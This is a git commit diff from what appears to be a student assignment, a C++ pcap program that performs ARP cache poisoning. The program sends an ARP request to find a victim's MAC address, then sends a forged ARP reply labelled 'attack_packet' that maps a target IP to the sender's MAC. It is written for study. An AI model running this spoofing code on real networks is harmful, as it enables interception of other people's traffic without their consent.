2588b95dcac34234d6e9bf7bf94c5d2fe260e2ac
gowonisgood <gowonisgood@pusan.ac.kr>
2025-08-02 11:03:38 +0900

    middle save 5

--- assginment3/main.cpp
+++ assginment3/main.cpp
@@ -8,6 +8,8 @@
 #include <net/if.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <iomanip>
+
 /* GO */
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -55,8 +57,9 @@ uint32_t c_to_u32_ip(const char* t_ip){
 EthArpPacket m_rq_packet(Mac me_mac, Ip m_ip, Ip v_ip){
     EthArpPacket packet;
 
-    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // broadcast
-    packet.eth_.smac_ = me_mac; // me
+    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // broadcast
+    //packet.eth_.smac_ = me_mac; // me
+    packet.eth_.smac_ = Mac("90:DE:80:9D:47:3F"); // me test
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -65,10 +68,12 @@ EthArpPacket m_rq_packet(Mac me_mac, Ip m_ip, Ip v_ip){
     packet.arp_.pln_ = Ip::Size;
 
     packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = me_mac; //me - malicious
-    packet.arp_.sip_ = m_ip;     //my ip
+    //packet.arp_.smac_ = me_mac; //me - malicious
+    packet.arp_.smac_ = Mac("90:DE:80:9D:47:3F"); //me - malicious
+    //packet.arp_.sip_ = m_ip;     //my ip
+    packet.arp_.sip_ = Ip("16.3.3.10");
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //unknown
-    packet.arp_.tip_ = v_ip;  //victim ip
+    packet.arp_.tip_ = htonl(v_ip);  //victim ip
 
     return packet;
 }
@@ -113,36 +118,66 @@ Mac get_s_mac(const u_char* packet){
     ArpHdr *arpHdr = (ArpHdr*) cpacket;
 
     s_mac = arpHdr->smac();
+
+    /*debug*/
+    const uint8_t* mac = reinterpret_cast<const uint8_t*>(&s_mac);
+    printf("s_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
     return s_mac;
 
 }
 
 
-string get_me_ip(const string& interface) {
+// string get_me_ip(const string& interface) {
+//     int fd = socket(AF_INET, SOCK_DGRAM, 0);
+//     if (fd == -1) {
+//         perror("socket");
+//         return "";
+//     }
+
+//     struct ifreq ifr;
+//     memset(&ifr, 0, sizeof(ifr));
+//     strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
+
+//     if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
+//         perror("ioctl");
+//         close(fd);
+//         return "";
+//     }
+
+//     close(fd);
+
+//     struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
+//     return string(inet_ntoa(ipaddr->sin_addr));
+// }
+
+uint32_t get_me_ip(const std::string& interface) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) {
         perror("socket");
-        return "";
+        return 0;
     }
 
     struct ifreq ifr;
-    memset(&ifr, 0, sizeof(ifr));
-    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
+    std::memset(&ifr, 0, sizeof(ifr));
+    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
+    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
 
     if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
         perror("ioctl");
         close(fd);
-        return "";
+        return 0;
     }
 
     close(fd);
 
     struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
-    return string(inet_ntoa(ipaddr->sin_addr));
+    // s_addr는 네트워크 바이트 순서라서 ntohl로 호스트 순서로 변환
+    return ntohl(ipaddr->sin_addr.s_addr);
 }
 
-
-bool get_me_mac(const string& interface, uint8_t mac[6]) {
+bool get_me_mac(const std::string& interface, uint8_t mac[6]) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
         perror("socket");
@@ -150,8 +185,9 @@ bool get_me_mac(const string& interface, uint8_t mac[6]) {
     }
 
     struct ifreq ifr;
-    memset(&ifr, 0, sizeof(ifr));
-    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
+    std::memset(&ifr, 0, sizeof(ifr));
+    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
+    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
 
     if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
         perror("ioctl");
@@ -161,15 +197,48 @@ bool get_me_mac(const string& interface, uint8_t mac[6]) {
 
     close(sock);
 
-    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+    std::memcpy(mac, reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data), 6);
     return true;
 }
+
+/*std::string get_me_mac(const std::string& interface) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        return "";
+    }
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof(ifr));
+    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
+    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
+
+    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
+        perror("ioctl");
+        close(sock);
+        return "";
+    }
+
+    close(sock);
+
+    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
+    std::ostringstream oss;
+    oss << std::uppercase << std::hex << std::setfill('0');
+    for (int i = 5; i >= 0; --i) {
+        oss << std::setw(2) << static_cast<int>(mac[i]);
+        if (i != 0)
+            oss << ':';
+    }
+    return oss.str(); // 예: "3F:47:9D:80:DE:90"
+}*/
+
 
 EthArpPacket m_a_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = v_mac; // you - send
-    packet.eth_.smac_ = me_mac; // me
+    //packet.eth_.smac_ = me_mac; // me
+    packet.eth_.smac_ = Mac("90:DE:80:9D:47:3F"); // me
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -178,7 +247,8 @@ EthArpPacket m_a_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip){
     packet.arp_.pln_ = Ip::Size;
 
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = me_mac; //me - malicious
+    //packet.arp_.smac_ = me_mac; //me - malicious
+    packet.arp_.smac_ = Mac("90:DE:80:9D:47:3F");
     packet.arp_.sip_ = t_ip;     //target ip
     packet.arp_.tmac_ = v_mac; //you - victim mac
     packet.arp_.tip_ = v_ip;  //you - victim ip
@@ -208,24 +278,26 @@ int main(int argc, char* argv[]) {
         }
 
         //2. make request packet
-        uint8_t me_mac_array[6]; //Todo: change type (uint8_t -> Mac)
-        Mac me_mac;
+        uint8_t me_mac_ar[6];
+        get_me_mac(dev,me_mac_ar);
 
-        string me_ip_s; //Todo: change type (string -> IP)
-        Ip me_ip;
+        printf("me_mac_ar:");
+        for(int i=0;i<6;i++) printf("%0x", me_mac_ar[i]);
+        printf("\n");
 
-        Ip v_ip = Ip(c_to_u32_ip(argv[re*2+2])); //TODO : is it right ? argv?
+        Mac me_mac = Mac(me_mac_ar); // i dont know is it right
 
-        //if (!get_s_mac(dev,packet,argv[re*2+3],s_mac)) continue; //not arp or not broadcast or not target ip
-        if (!get_me_mac(dev, me_mac_array)) cerr << "fail to get me_mac\n";
-        me_mac = Mac(me_mac_array);
+        printf("%02X", get_me_ip(dev));
+        Ip me_ip = Ip(get_me_ip(dev));
 
-        me_ip_s = get_me_ip(dev);
-        me_ip = Ip(me_ip_s);
+        Ip v_ip = Ip(c_to_u32_ip(argv[re*2+2]));
 
-        printf("me mac: %x, me_ip: %x, v_ip: %x\n", me_mac, me_ip,v_ip); //debug
+
+
+        printf("me mac: %02x, me_ip: %02x, v_ip: %02x\n", me_mac, me_ip,v_ip); //debug
 
         EthArpPacket r_packet = m_rq_packet(me_mac, me_ip, v_ip);
+
 
         //send the request_packet
         int res1 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&r_packet), sizeof(EthArpPacket));
@@ -256,9 +328,16 @@ int main(int argc, char* argv[]) {
             Mac s_mac = get_s_mac(packet);
 
             //5. make attack packet
-            Ip t_ip = Ip(c_to_u32_ip(argv[re*2+3]));
+            Ip t_ip = Ip(c_to_u32_ip(argv[re*2+3])); //fucking here you need to check
 
-            EthArpPacket attack_packet = m_a_packet(me_mac, t_ip, s_mac, v_ip);
+            /* debug */
+            const uint32_t* tt_ip = reinterpret_cast<const uint32_t*>(&t_ip);
+            printf("tt_ip: %u\n", *tt_ip);
+
+            Ip ttt_ip = Ip(htonl(*tt_ip));
+
+
+            EthArpPacket attack_packet = m_a_packet(me_mac, ttt_ip, s_mac, v_ip);
 
             //6. send the attack_packet
             int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
